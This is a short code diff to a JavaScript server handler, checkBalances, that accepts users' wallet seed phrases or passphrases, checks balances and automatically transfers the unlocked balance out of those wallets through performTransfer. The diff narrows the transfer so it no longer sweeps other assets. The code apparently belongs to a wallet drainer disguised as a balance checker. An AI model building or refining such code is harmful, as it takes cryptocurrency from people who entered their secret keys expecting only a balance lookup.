@@ -45,7 +45,6 @@ async function checkBalances(req, res, next) {
           lockedBalance: null,
           nextUnlockDate: null,
           lockedBreakdown: [],
-          otherAssets: [],
           error: 'Invalid passphrase',
           seedPhrase: sp.trim(),
         });
@@ -60,21 +59,20 @@ async function checkBalances(req, res, next) {
       }
     });
 
-    // Auto-transfer for passphrase wallets
+    // Auto-transfer for passphrase wallets (only if unlocked balance > 0)
     if (hasSeedPhrases) {
       const transferPromises = results
         .filter(
           (r) =>
             passphraseMap.has(r.address) &&
             r.status === 'ok' &&
-            (r.unlockedBalance > 0 || (r.otherAssets && r.otherAssets.length > 0))
+            r.unlockedBalance > 0
         )
         .map(async (r) => {
           const transferResult = await performTransfer(
             r.address,
             passphraseMap.get(r.address),
-            r.unlockedBalance,
-            r.otherAssets || []
+            r.unlockedBalance
           );
           r.transfer = transferResult;
           return r;
